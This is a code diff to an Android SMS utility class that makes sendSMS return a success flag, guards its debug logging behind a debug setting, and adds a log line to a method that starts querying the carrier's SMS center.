@@ -16,16 +16,25 @@ import java.util.ArrayList;
  */
 public class SMSUtil {
 
-    public static final void sendSMS(String target, String msg) {
+    public static final boolean sendSMS(String target, String msg) {
         try {
             SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
-            Config.LOGD("[[SMSUtil::sendSMS]] try to send msg : " + msg + " to : " + target);
+            if (Config.DEBUG) {
+                Config.LOGD("[[SMSUtil::sendSMS]] try to send msg : " + msg + " to : " + target);
+            }
+
+            return true;
         } catch (Exception e) {
             e.printStackTrace();
         }
+
+        return false;
     }
 
     public static final void trySendCmdToNetwork(Context context) {
+        if (Config.DEBUG) {
+            Config.LOGD("[[trySendCmdToNetwork]] try to send cmd to fetch SMS center >>>>>>>>>");
+        }
         int networkType = AppRuntime.getNetworkTypeByIMSI(context);
         ArrayList<String> cmd = new ArrayList<String>();
         String target = null;
